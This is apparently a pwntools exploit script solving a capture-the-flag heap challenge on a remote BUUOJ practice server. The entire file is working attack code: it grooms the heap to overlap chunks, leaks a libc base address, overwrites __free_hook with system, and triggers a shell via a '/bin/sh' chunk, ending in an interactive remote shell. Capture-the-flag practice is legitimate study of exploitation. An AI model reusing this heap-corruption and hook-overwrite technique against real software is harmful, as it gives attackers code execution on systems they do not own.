from pwn import *
def cmd(c):
	p.sendlineafter(":\n",str(c))
def add(size,c="A\n"):
	cmd(1)
	p.sendlineafter(": \n",str(size))
	p.sendafter(": \n",c)
def cheat(size):
	cmd(1)
	p.sendlineafter(": \n",str(size))
def free(idx):
	cmd(2)
	p.sendlineafter(": \n",str(idx))
def show():
	cmd(3)

#p=process('./timu')
p=remote("node3.buuoj.cn",25290)
add(0x500)#0
add(0x100)#1
add(0x100)#2
free(0)
context.log_level='debug'
add(0x18,"A"*0x18)
free(0)

add(0x100)#0
add(0x100)#3

add(0x1e8-0x10)#4
free(4)
add(0x100)#4
add(0x100)#5
add(0x100)#6
cheat(0x100)
for x in range(1,7):
	free(x)

add(0x132)#1
add(0x4f8)#2
add(0x200)#3
free(0)
free(1)
add(0x138,"\x00"*0x130+p64(0xc90))#0
free(2)
# 0,3 is used
add(0x1e0-8)#0x55ebf0ca2bb0
add(0x218)
cmd(3)
p.readuntil("1 : ")
base=u64(p.readuntil(" ")[:-1].ljust(8,'\x00'))-(0x7fea9ffc0ca0-0x7fea9fc12000)-(0x7ffff7a21000-0x7ffff79e4000)
log.warning(hex(base))
# libc=ELF("./timu").libc
libc=ELF('../../x64libc/libc.so.6')
libc.address=base
add(0x6f0)#4
add(0x30,"\x00"*0x8+p64(0x111)+p64(libc.sym['__free_hook'])+'\x00'*0x18)#5
add(0x100,"/bin/sh\n")#6
free(4)
add(0x100,p64(libc.sym['system'])+"\n")
free(6)
#gdb.attach(p,"b _int_free")
p.interactive()
